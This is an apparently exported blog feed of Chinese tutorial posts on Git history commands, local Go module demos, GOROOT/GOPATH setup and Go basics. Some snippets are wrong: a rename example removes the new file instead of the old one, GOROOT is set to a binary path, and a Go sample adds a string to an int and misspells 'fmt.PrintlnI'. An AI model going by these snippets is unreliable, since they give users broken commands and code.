        <content type="html"><![CDATA[<h2 id="版本控制">版本控制</h2><ol start="0" type="1"><li><p>HEAD 指向的版本就是当前版本，因此，Git允许我们在版本的历史之间穿梭，使用命令<code>git reset --hard commit_id</code> 或<code>git reset --hard HEAD^</code>等指针控制</p><p>Git 必须知道当前版本是哪个版本，在 Git 中，用 <code>HEAD</code>表示当前版本，也就是最新的提交<code>1094adb...</code>（注意我的提交 ID和你的肯定不一样），上一个版本就是<code>HEAD^</code>，上上一个版本就是<code>HEAD^^</code>，当然往上 100 个版本写 100个^比较容易数不过来，所以写成 <code>HEAD~100</code>。</p><p>当然，也可以用版本号标识版本， 版本号没必要写全，前几位就可以了，Git会自动去(当然也不能只写前一两位，因为 Git可能会找到多个版本号，就无法确定是哪一个了)</p></li><li><p><code>git log</code> :查看提交的历史记录，以便确定回退到哪个版本</p><p>和 SVN 不一样，Git 的 commit id 不是 1，2，3……递增的数字，而是一个SHA1 计算出来的一个非常大的数字，用十六进制表示.因为 Git是分布式的版本控制系统，后面我们还要研究多人在同一个版本库里工作,避免冲突。</p><p>每提交一个新版本，实际上 Git就会把它们自动串成一条时间线。如果使用可视化工具查看 Git历史，就可以更清楚地看到提交历史的时间线：</p><ol type="1"><li><p>每个版本输出一行简洁的信息 <code>git log</code>默认是查看当前分支，显示从最近到最远的提交日志。</p></li><li><p>每个版本输出一行简洁的信息</p><p>如果嫌输出信息太多，看得眼花缭乱的，加上<code>--oneline</code> 为<code>--pretty=oneline --abbrev-commit</code> 的缩写</p></li><li><p>指定输出最近的几个 commit <code>-&lt;number&gt;</code> 或<code>-n &lt;number&gt;</code></p></li><li><p><code>--all</code> 查看所有分支的 commit 记录。</p></li><li><p><code>branch_name</code> 指定查看某个分支，直接加分支名 例如:<code>git log --oneline dev</code> 查看 dev 分支的 commit历史。</p></li><li><p><code>--graph</code> Draw a text-based graphical representationof the commit history on the left hand side of the output.</p></li><li><p>gitk</p><p>通过 git 自带的图形化工具查看版本历史。 使用:在仓库路径的终端下，输入 <code>gitk</code></p></li></ol></li><li><p><code>git reflog</code> 查看 git命令历史，以便确定要回到之前的那个版本。当你回退到旧版本后，需要知道新版本的 commit_id 才能回退到新版本。</p><p>大致有两种方式查看新版本 <code>commit_id</code></p><ol type="1"><li>如果你提交新版本的命令行结果还在，即:<code>git commit xx -m "xx"</code> 的结果会返回 新版本<code>commit_id</code> 在你回退到旧版本之前，<code>git log</code> 也有<code>commit_id</code>， 不过，回退之后就没了。</li><li><code>git reflog</code> 查看 git命令历史，有移动指针记录以及在每行开头有每次的当前版本的版本号(<code>commit_id</code>)</li></ol></li></ol><h2 id="管理修改">管理修改</h2><p>为什么 Git 比其他版本控制系统设计得优秀，因为 Git跟踪并管理的是修改，而非文件。什么是修改？比如你新增了一行，这就是一个修改，删除了一行，也是一个修改，更改了某些字符，也是一个修改，删了一些又加了一些，也是一个修改，甚至创建一个新文件，也算一个修改。</p><p>第一次修改 -&gt;<code>git add</code> -&gt; 第二次修改 -&gt;<code>git add</code> -&gt; <code>git commit</code> 第一次修改 -&gt;第二次修改 -&gt; <code>git add</code>-&gt; <code>git add</code> -&gt;<code>git commit</code></p><p>每次修改，如果不用 <code>git add</code> 到暂存区，那就不会加入到commit 中</p><p>小结：</p><p>场景1：当你改乱了工作区某个文件的内容，想直接丢弃工作区的修改时，用命令<code>git restore &lt;filename&gt;</code>。</p><p>场景2：当你不但改乱了工作区某个文件的内容，还添加到了暂存区时，想丢弃修改，分两步，第一步用命令<code>git restore --staged &lt;file&gt;</code>，就回到了场景1，第二步按场景 1 操作。</p><p>场景3：已经提交了不合适的修改到版本库时，想要撤销本次提交，参考版本回退一节，不过前提是没有推送到远程库。</p><h2 id="重命名文件">重命名文件</h2><p>方法一:（推荐） <code>git mv filename_old filename_new</code></p><p>方法二:(不推荐，但是要是不小心误操作了，我们要知道如何处理)若不小心进行了: <code>mv filename_old filename_new</code>,然后想将变更提交至 stage 时，有以下几种操作: 1. 使用<code>git add</code> 的 <code>-A</code> 选项<code>git add -A filename_old filename_new</code> 在前面我们讲了<code>git add -A</code> 如果不加 <code>&lt;pathspec&gt;</code>则会将所有变更(新增文件，修改，删除)都会提交至 stage。而当我们指定<code>&lt;pathspec&gt;</code>时，就只将对该文件(们)的所有变更(新增文件，修改，删除)提交至 stage。 2.一步步来</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git add filename_new</span><br><span class="line">git rm filename_new</span><br></pre></td></tr></table></figure><p>先了解一下，<code>git reset --hard</code> 命令，方便上面功能的测试。作用: 彻底回退到某个版本，本地的源码(workingdirectory、stage)也会变为上一个版本的内容，此命令慎用！</p><h2 id="删除文件">删除文件</h2><p>当你要删除文件的时候，可以采用命令：<code>rm test.txt</code></p><p>这个时候（也就是说这个时候只执行了 rm test.txt）有两种情况</p><p>第一种情况: 的确要把 test.txt 删掉，那么可以执行<code>git rm test.txt</code> <strong>删除暂存区的修改</strong>，<code>git commit -m "remove test.txt"</code>提交到仓库，然后文件就被彻底删除了</p><p>第二种情况: 删错文件了，不应该删 test.txt，注意这时只执行了<code>rm test.txt</code>，还没有提交，所以可以执行<code>git restore test.txt</code> 将文件恢复。</p><p>并不是说执行完 <code>git commit -m "remove test.txt"</code> 后还能用<code>restore</code> 恢复，commit 之后版本库里的文件也没了，自然没办法用restore 恢复，而是要用其他的办法</p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go 项目写 demo</title>
      <link href="/blog/2022/10/16/programming/go/go_demo/"/>
      <url>/blog/2022/10/16/programming/go/go_demo/</url>
      
        <content type="html"><![CDATA[<h1 id="go-项目写-demo">Go 项目写 demo</h1><p>对一个本地的 Go 库写 demo, 应该如何配置:</p><ol type="1"><li><p>新建一个目录,包含包文件夹</p></li><li><p>在与包文件夹 example 同目录下建立 <code>main.go</code>,然后在其中导入模块名 <code>import ("example")</code></p></li><li><p>在当前目录下,</p><p><code>go mod init module_name</code> 初始化 go.mod 添加下面语句到go.mod,从而导入本地的包 example, replace 最后为相对路径.</p><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">require example v0.0.0</span><br><span class="line">replace example v0.0.0 =&gt; ./example</span><br></pre></td></tr></table></figure></p></li><li><p>执行 <code>go mod tidy</code>删除不需要的依赖包、下载新的依赖包、更新 go.sum</p></li><li><p>运行 <code>main.go</code></p></li></ol><h2 id="参考">参考</h2><ol type="1"><li><p><a href="https://www.cnblogs.com/lxz123/p/15346689.html">missinggo.sum entry for module providing package <package_name> - 升级打怪 -博客园</a></p></li><li><p><ahref="https://blog.csdn.net/ZXT149074136/article/details/121999432">build项目时出现报错--本地开发的包导入： missing go.sum entry for moduleproviding package_奔跑的 Camille 的博客-CSDN 博客_c 语言 build时出错</a></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>GOROOT、GOPATH 以及 Go 相关命令</title>
      <link href="/blog/2022/10/16/programming/go/go_envs/"/>
      <url>/blog/2022/10/16/programming/go/go_envs/</url>
      
        <content type="html"><![CDATA[<p>最近在配置 VSCode 的 Go 插件时，总是报错找不到包之类的，发现时 GOPATH和 GOROOT在该编辑器中没有配置，借此了解一下两个环境变量。目前笔者用系统是 macOSBigSur，Go 版本 1.16.6</p><h2 id="goroot">GOROOT</h2><p><code>$GOROOT</code>,便是 Go 的安装路径，存放 Go的内置程序库。通常你安装完后，你电脑的环境变量就会设好 GOROOT路径。当你开发 Go 程序的时候，当你 import内置程序库的时候，并不需要额外安装，而当程序运行后， 默认也会先去 GOROOT路径下寻找相对应的库来运行。</p><p>通过 <code>go env</code> 可以查看有关 Go语言的相关环境变量设定。通常如果你是初次安装Go，并且没做什么环境变量设定的话，GOROOT 设定路径就是你当初安装 Go语言的路径，通常类似于<code>/usr/local/go</code>、<code>/usr/local/Cellar/go/1.xx.x/libexec</code>，一般为前者做软连接到后者。而GOPATH 通常默认会是用户目录下的 go 文件夹，通常类似于<code>$HOME/go</code>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">realyee @ 192 <span class="keyword">in</span> /usr/local/Cellar/go/1.16.6/libexec</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">tree ./ -L 1</span></span><br><span class="line">./</span><br><span class="line">├── CONTRIBUTING.md</span><br><span class="line">├── CONTRIBUTORS</span><br><span class="line">├── PATENTS</span><br><span class="line">├── SECURITY.md</span><br><span class="line">├── VERSION</span><br><span class="line">├── api</span><br><span class="line">├── bin</span><br><span class="line">├── doc</span><br><span class="line">├── favicon.ico</span><br><span class="line">├── lib</span><br><span class="line">├── misc</span><br><span class="line">├── pkg</span><br><span class="line">├── robots.txt</span><br><span class="line">├── src</span><br><span class="line">└── test</span><br><span class="line"></span><br><span class="line">8 directories, 7 files</span><br></pre></td></tr></table></figure><p>上述文件，有三点可了解： bin 目录：执行文件：go、gofmt，甚至 godocdoc 目录：Go 各个版本的文档 src 目录：go 标准库源码</p><h2 id="gopath">GOPATH</h2><p>Go 采用包管理，没有项目的概念。Go 工作区是 Go管理我们的源文件、编译的二进制文件和缓存对象的地方，缓存对象用于以后更快的编译。虽然也可以有多个工作区，但通常建议只有一个。GOPATH便充当工作区的根文件夹。</p><p>GOPATH，也叫工作区目录（workspace directory），是 Go 代码所在的目录，Go 寻找 Go 工作区的位置。如果未设置环境变量，默认情况下，Go 假定我们的GOPATH 位置在 <code>$HOME/go</code>，其中 <code>$HOME</code>是我们计算机上用户帐户的根目录。 我们可以通过设置 $GOPATH环境变量来改变它。 如需进一步学习，请按照本教程阅读和设置 Linux中的环境变量。要检查这一点，请输入以下命令：<code>go env GOPATH</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">go <span class="built_in">env</span> GOPATH</span></span><br><span class="line">/Users/realyee/go</span><br></pre></td></tr></table></figure><p>一个 GOPATH 工作区，一般这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">./</span><br><span class="line">├── bin</span><br><span class="line">├── pkg</span><br><span class="line">└── src</span><br><span class="line">    ├── hello_github</span><br><span class="line">    └── hello_router.go</span><br></pre></td></tr></table></figure><ol type="1"><li>bin：保存编译后生成的可执行文件。我们的操作系统使用<code>$PATH</code>环境变量来查找无需完整路径即可执行的二进制应用程序，建议将此目录:<code>$GOPATH/bin</code>添加到我们的全局<code>$PATH</code> 变量中。</li><li>pkg：它保存已安装的包对象（比如：.a）。每个目标操作系统和体系结构对都有自己的pkg 子目录。 Go 编译包时生成的中间文件，用来缓存提高编译效率。</li><li>src：包含源代码(比如：.go .c .h .s 等)。 该路径决定 import包时的导入路径或可执行文件名称。 import 包的搜索顺序：<ol type="1"><li>GOROOT/src：该目录保存了 Go 标准库代码。</li><li>GOPATH/src：该目录保存了应用自身的代码和第三方依赖的代码。</li></ol></li></ol><h2 id="goroot-和-gopath-配置">GOROOT 和 GOPATH 配置</h2><ol type="1"><li><p>查看二者的环境变量 <code>go env</code> 查看 Go 相关全部环境变量<code>go env 变量名</code>，如：<code>go env GOROOT</code>、<code>go env GOPATH</code>等</p></li><li><p>配置 GOROOT 一般情况下 GOROOT 无需配置，但是如果你看到 GOROOT为空，那可以：</p><ol type="1"><li><code>which go</code> 查看 go 的位置 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ go env GOROOT</span><br><span class="line">/usr/local/Cellar/go/1.16.6/libexec</span><br><span class="line">(base)</span><br><span class="line"># realyee @ 192 in ~/go/src [15:40:34]</span><br><span class="line">$ which go</span><br><span class="line">/usr/local/bin/go</span><br><span class="line">(base)</span><br><span class="line"># realyee @ 192 in ~/go/src [15:41:41]</span><br><span class="line">$ ll /usr/local/bin/go</span><br><span class="line">lrwxr-xr-x  1 realyee  admin    26B Aug  8 21:08 /usr/local/bin/go -&gt; ../Cellar/go/1.16.6/bin/go</span><br></pre></td></tr></table></figure></li><li>设置环境变量 <code>export GOROOT=/usr/local/bin/go</code></li></ol></li><li><p>配置 GOPATH</p><ol type="1"><li>在电脑上任意位置创建工作区目录，例如：<code>~/GO_PROJECTS</code></li><li>设置环境变量 <code>export GOPATH=~/GO_PROJECTS</code></li></ol></li></ol><h2 id="go-rungo-build-和-go-get">go run、go build 和 go get</h2><h3 id="go-run">go run</h3><p>gorun，简单理解就像是解释的方式来执行代码，而在细节上它其实会将代码进行编译，最后产生可执行文件，然后运行该可执行文件，产生程序执行后的结果，而可执行文件会放在特定的临时文件里面，执行完就会自动删除了。通常开发上就是用于假设只是要测试一段代码，那就会用 go run 来执行。</p><h3 id="go-build">go build</h3><p><code>go build</code>仅仅编译以导入路径命名的包及其依赖项，将其放到本地。通常在 $GOPATH目录下执行 go build，Go 会自动去 src下寻找对应项目目录，默认是在当前目录下生成可执行文件。</p><p>go build 缺点：每次编译代码，比较没有效率，当项目架构越来越大，build的速度也就越来越慢。</p><h3 id="go-install">go install</h3><p>因为 go build 的缺点，因此有 go install 指令，go install可以做两件事情：</p><ul><li>将包编译成.a中间缓存对象，如果源码尚未更改，将在下一次编译期间使用缓存。</li><li>如果是 main 包，并将其编译成可执行文件</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── bin</span><br><span class="line">│   └── hello  # by go install</span><br><span class="line">└── src</span><br><span class="line">    └── hello</span><br><span class="line">        ├── hello  # by go build</span><br><span class="line">        └── hello.go</span><br></pre></td></tr></table></figure><p>注意：</p><ul><li>go install 如果要在非 GOPATH 路径下使用的话，要先设定 GOBIN环境变量，否则会出现错误</li><li>通常 GOBIN 环境变量就是设定 GOPATH/bin。</li></ul><h3 id="go-getdeprecated-in-go1.16">go get(deprecated in go1.16)</h3><p>GOPATH 很大的缺点，就是相关第三方包只要不是官方库，都需要放置在GOPATH/src 的路径下才可使用。通常我们会使用 go get指令来获取网络上的第三方包，并安装到本地，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go get github.com/gin-gonic/gin</span><br></pre></td></tr></table></figure><p>当我们从 Github 上下载第三方包多了之后，会发现 GOPATH/src下的代码会很复杂，除了有你自己开发的项目文件夹，也包含其他第三方库的项目文件夹。</p><p>此外，如果你开发的项目采用第三方套件是不同版本也很棘手。以往的解决方法是要设定多组不同的GOPATH。 虽然社群也有开发相对应的 package manager，如 Vendor、Dep来解决该问题，但毕竟不是官方主导的。因此，<strong>有了 Go Modules的诞生</strong>，我们下一篇文章再讲。</p><p>但是从 Go 1.16 开始逐渐废弃 go get 安装包的功能，详细见<ahref="https://go.dev/blog/go116-module-changes">New module changes in Go1.16 - go.dev</a>，<strong>官方推荐使用 go install 带版本安装</strong>,使用示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">go install golang.org/x/tools/gopls@latest</span><br><span class="line">go install golang.org/x/tools/gopls@v0.6.5</span><br></pre></td></tr></table></figure><h2 id="go-doc">go doc</h2><p>可以使用 go doc[包][.函数名]查看包或函数的详细源码，经常查看源码方便理解 Go 函数的原理例如：<code>go doc fmt</code>、<code>go doc fmt.Printfln</code></p><h2 id="参考资料">参考资料</h2><blockquote><ol type="1"><li><ahref="https://pkg.go.dev/cmd/go#hdr-GOPATH_environment_variable">gocmd/go pkg.go.dev</a></li><li><ahref="https://stackoverflow.com/questions/7970390/what-should-be-the-values-of-gopath-and-goroot">go- What should be the values of GOPATH and GOROOT? - StackOverflow</a></li><li><ahref="https://medium.com/%E4%BC%81%E9%B5%9D%E4%B9%9F%E6%87%82%E7%A8%8B%E5%BC%8F%E8%A8%AD%E8%A8%88/golang-goroot-gopath-go-modules-%E4%B8%89%E8%80%85%E7%9A%84%E9%97%9C%E4%BF%82%E4%BB%8B%E7%B4%B9-d17481d7a655">Golang— GOROOT、GOPATH、Go-Modules-三者的關係介紹 | by 陳冠億 Kenny |企鵝也懂程式設計 | Medium</a></li><li><ahref="https://stackoverflow.com/questions/7970390/what-should-be-the-values-of-gopath-and-goroot">go- What should be the values of GOPATH and GOROOT? - StackOverflow</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vscode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang 简介与入门</title>
      <link href="/blog/2022/10/16/programming/go/go_intro/"/>
      <url>/blog/2022/10/16/programming/go/go_intro/</url>
      
        <content type="html"><![CDATA[<h2 id="go-courses">Go courses</h2><ol type="1"><li><a href="https://github.com/Unknwon/go-fundamental-programming">Go基础教程</a></li><li><a href="https://golangr.com/exercises/">Go Exercises | Learn GoProgramming</a></li><li><a href="https://exercism.org/my/tracks/go">Exercism</a></li><li><a href="https://courses.calhoun.io/courses">Courses Dashboard |courses.calhoun.io</a></li></ol><h2 id="什么是-go">1. 什么是 Go？</h2><p>Go 是一门 <strong>并发支持 、垃圾回收 的 编译型系统编程语言</strong>，旨在创造一门具有在静态编译语言的<strong>高性能</strong>和动态语言的<strong>高效开发</strong>之间拥有良好平衡点的一门编程语言。</p><p>Go 的主要特点有哪些？</p><ul><li><strong>类型安全</strong>和<strong>内存安全</strong></li><li>以非常<strong>直观</strong>和<strong>极低代价</strong>的方案实现高并发</li><li><strong>高效</strong>的垃圾回收机制</li><li><strong>快速编译</strong>（同时解决 C 语言中头文件太多的问题）</li><li>为多核计算机提供性能提升的方案</li><li><strong>UTF-8</strong> 编码支持</li></ul><p>Go 环境变量与工作目录</p><p>根据约定，GOPATH 下需要建立 3 个目录:</p><ul><li>bin（存放编译后生成的可执行文件）</li><li>pkg（存放编译后生成的包文件）</li><li>src（存放项目源码）</li></ul><p>Go 常用命令简介</p><ul><li>go get：获取远程包（需提前安装 git 或 hg）</li><li>go run：直接运行程序（直接编译生成临时文件，直接开始运行）</li><li>go build：测试编译，检查是否有编译错误（ package 名称为：main的才可以使用它，然后生成可执行文件）</li><li>go fmt：格式化源码（部分 IDE 在保存时自动调用）</li><li>go install：编译包文件并编译整个程序(编译包文件 -&gt;生成“操作系统名_cpu 型号” 的文件夹 -&gt; 在该文件夹下的 bin文件夹里生成可执行文件 -&gt; 当你要运行时，需要把可执行文件拷到 bin文件夹同级别， 因为是相对路径)</li><li>go test：运行测试文件(以 “*_test.go” 结尾的文件)</li><li>go doc：查看文档</li></ul><h2 id="简单例子">1.1. 简单例子</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">        fmt.Println(<span class="string">&quot;Hello World&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>go build 会编译名为 main 的 package包，然后我们导入管理格式化输入输出的 fmt 包。 func main(){} 是函数，而且main 函数没有参数以及返回值， 左边 <code>&#123;</code> 需要和 main()同行，因为 go 虽然不想 c 语言显式要求以分号结尾，但是编译器会自动加上，如果把 左 <code>&#123;</code> 下载下一行，那么就会报错。</p><h2 id="格式化输入">1.2. 格式化输入</h2><p>fmt.Print vs fmt.Println vs fmt.Printf</p><p><code>fmt.Print</code> and <code>fmt.Println</code> print the rawstring (<code>fmt.Println</code> appends a newline)</p><p><code>fmt.Printf</code> will not print a new line, you will have toadd that to the end yourself with <code>\n</code>.</p><p>The way <code>fmt.Printf</code> works is simple, you supply a stringthat contains certain symbols, and the other arguments replace thosesymbols. For example:</p><p>参考：<ahref="https://stackoverflow.com/questions/53879154/println-vs-printf-vs-print-in-go">Printlnvs Printf vs Print in Go - Stack Overflow</a></p><h1 id="go-程序结构">2. Go 程序结构</h1><h2 id="基本结构">2.1. 基本结构</h2><ul><li>Go 程序是通过 package 来组织的</li><li>只有 package 名称为<code>main</code> 的包可以包含 main 函数</li><li>一个可执行程序 <strong>有且仅有</strong> 一个 main 包</li></ul><h2 id="关键字标识符">2.2. 关键字标识符</h2><ul><li>通过 <code>import</code> 关键字来导入其它非 main 包</li><li>通过<code>const</code> 关键字来进行常量的定义</li><li>通过在函数体外部使用 var 关键字来进行全局变量的声明与赋值</li><li>通过 <code>type</code>关键字来进行结构(<code>struct</code>)或接口(<code>interface</code>)的声明</li><li>通过<code>func</code> 关键字来进行函数的声明 Go 导入 package的格式:</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>(</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;math&quot;</span></span><br><span class="line">    <span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>导入包之后，就可以使用格式 <PackageName>.<FuncName>来对包中的函数进行调用 如果导入包之后 未调用其中的函数或者类型将会报出编译错误：imported and not used</p><h2 id="package-别名">2.3. Package 别名</h2><p>当使用第三方包时，包名可能会非常接近或者相同，此时就可以使用别名来进行区别和调用。例如：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">import</span>(</span><br><span class="line">    io <span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line">...</span><br><span class="line">io.Println(<span class="string">&quot;Hello World&quot;</span>)</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="省略调用">2.3.1. 省略调用</h3><p>相当于把包别名定义成 <code>.</code>当前目录，然后就可以直接使用包中的函数了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import(</span><br><span class="line">    . &quot;fmt&quot;</span><br><span class="line">)</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>不建议使用，易混淆</li><li>不可以和别名同时使用</li></ul><h2 id="可见性规则">2.4. 可见性规则</h2><p>Go 语言中，使用 大小写 来决定该 常量、变量、类型、接口、结构 或函数是否可以被外部包所调用：</p><p>根据约定，函数名首字母<strong>小写</strong>即为private，函数名首字母<strong>大写</strong>即为 public.这样，当你调用其他包的函数时，函数开头一定为大写，否则就写错了。</p><p>简单 go 程序：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 当前程序包名， package main 需要下载非注释的第一行</span></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="comment">//导入其他包名</span></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;math/rand&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">//常量的定义</span></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">PI     = <span class="number">3.14</span></span><br><span class="line">const1 = <span class="number">1</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">//全局变量的声明与赋值</span></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">name = <span class="string">&quot;gopher&quot;</span></span><br><span class="line">id   = <span class="number">3</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 一般类型声明</span></span><br><span class="line"><span class="keyword">type</span> (</span><br><span class="line">newType <span class="type">int</span></span><br><span class="line">type1   <span class="type">float32</span></span><br><span class="line">type2   <span class="type">string</span></span><br><span class="line">type3   <span class="type">byte</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">//结构声明</span></span><br><span class="line"><span class="keyword">type</span> gopher <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//接口声明</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> golang <span class="keyword">interface</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//由 main 函数作为程序入口点启动</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Hello World&quot;</span> + rand.Intn(<span class="number">19</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>导入多个包时可以进行简写，声明多常量、全局变量或一般类型（非接口、非结构）也可以用同样的方法，我们称之为"常量组， 全局变量组，一般类型组" 注意：<code>var</code>声明全局变量的方法，不适合在函数中声明变量使用，只适合全局变量</p><h1 id="go-基本类型">3. Go 基本类型</h1><h2 id="类型">类型</h2><ol type="1"><li><p>布尔型 布尔型 <code>bool</code> - 长度：1 字节 -取值范围：true。false - 注意事项：不可以用数字代替 true 或false，也不能和整形进行强制类型转换，二者是不兼容的类型 2.整形<code>int/uint</code> - 根据运行平台可能为 32 或 64 位</p><pre><code>8 位整型：`int8/uint8`- 长度：1字节- 取值范围：-128~127/0~255字节型：`byte`(`uint8` 的别名`)    为什么要有别名的？为了更好地区分应用场景，增强代码可读性。    比如：这里当你想要进行字节相关的操作时， 显然用 byte 更加具体，可读。16位整型：`int16/uint16`    - 长度：2字节    - 取值范围：-32768~32767/0~6553532位整型：`int32（rune）/uint32`    - 长度：4字节    - 取值范围：-2^32/2~2^32/2-1/0~2^32-1    - rune 当场景与 unicode 有关时。64位整型：`int64/uint64`    - 长度：8字节    - 取值范围：-2^64/2~2^64/2-1/0~2^64-1</code></pre></li><li><p>浮点型：<code>float32/float64</code></p><ul><li>长度：4/8 字节</li><li>小数位：精确到 7/15 小数位</li></ul></li><li><p>复数：<code>complex64/complex128</code></p><ul><li>长度：8/16 字节 足够保存指针的 32 位或 64 位整数型：uintptr</li></ul></li><li><p>其它值类型：</p><ul><li><code>array、struct、string</code></li></ul></li><li><p>引用类型：</p><ul><li><code>slice、map、chan</code> slice 切片， map 类似 hash table，chan 通道，处理高并发通信</li></ul></li><li><p>接口类型：<code>inteface</code></p></li><li><p>函数类型：<code>func</code></p></li><li><p>指针 Go 虽然保留了指针，但与其它编程语言不同的是，在** Go当中不支持指针运算以及 ”-&gt;” 运算符，而直接采用 ”.”选择符来操作指针目标对象的成员**</p></li></ol><p>操作符 ”&amp;” 取变量地址，使用 ”*” 通过指针间接访问目标对象 默认值为nil 而非 NULL</p><p>递增递减语句 在 Go 当中，++ 与 -- 是作为语句而并不是作为表达式，因此，需要将 <code>a++</code>, <code>a--</code>当作单独的语句来写，而不能放在等号右边，当作右值。 定义：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a := <span class="number">1</span></span><br><span class="line"><span class="keyword">var</span> p *<span class="type">int</span> = &amp;a</span><br><span class="line">fmt.PrintlnI(*p)</span><br></pre></td></tr></table></figure><p>补充： 